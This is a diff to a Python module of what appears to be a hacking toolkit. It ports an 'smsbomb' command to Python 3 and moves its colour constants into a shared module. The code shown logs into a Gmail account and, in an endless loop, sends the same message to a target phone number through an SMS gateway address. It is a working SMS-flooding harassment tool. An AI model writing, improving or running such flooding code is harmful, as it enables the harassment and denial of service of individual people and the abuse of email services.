@@ -1,6 +1,9 @@
 import getpass
 import smtplib
 
+from .. import consts
+from ..consts import ColorScheme as col
+
 
 SMSBOMB_MENU= [
     ("target <phone>", "Set the target's phone number"),
@@ -18,7 +21,7 @@ class SMTP(object):
 
     def smsbomb(self):
         while True:
-            command = raw_input(LP + "[smtp] smsbomb >> " + W)
+            command = input(col.LP + "[smtp] smsbomb >> " + col.W)
             try:
                 tokenized = command.split(" ")
                 if tokenized[0] == "target":
@@ -77,12 +80,12 @@ class SMTP(object):
                 elif tokenized[0] == "exit":
                     break
             except ValueError:
-                print(WARNING)
+                print(col.WARNING)
                 continue
             except KeyboardInterrupt: # Ctrl + C to go back to main menu
                 break
             except UnboundLocalError:
-                print(R + "[!] Parameters were not set before execution! [!]" + W)
+                print(col.R + "[!] Parameters were not set before execution! [!]" + col.W)
                 continue
 
     @staticmethod
@@ -90,17 +93,16 @@ class SMTP(object):
         obj = smtplib.SMTP("smtp.gmail.com:587")
         obj.starttls()
         obj.login(email, password)
-        message = raw_input(LC + "[>] Message: " + W )
+        message = input(col.LC + "[>] Message: " + col.W)
         target = str(phone) + str(attack)
         phone_message = ("From: %s\r\nTo: %s \r\n\r\n %s"
-           % (email, "" .join(target), "" .join(message)))
+           % (email, "".join(target), "".join(message)))
         while True:
              obj.sendmail(email, target, phone_message)
-             print(G + "[*] Sent! Sending again...Press Ctrl+C to stop!" + W)
-
+             print(col.G + "[*] Sent! Sending again...Press Ctrl+C to stop!" + col.W)
 
 
     def execute(self):
         if self.command == "smsbomb":
-            print_command_help(smsbomb_menu)
+            consts.print_command_help(SMSBOMB_MENU)
             self.smsbomb()
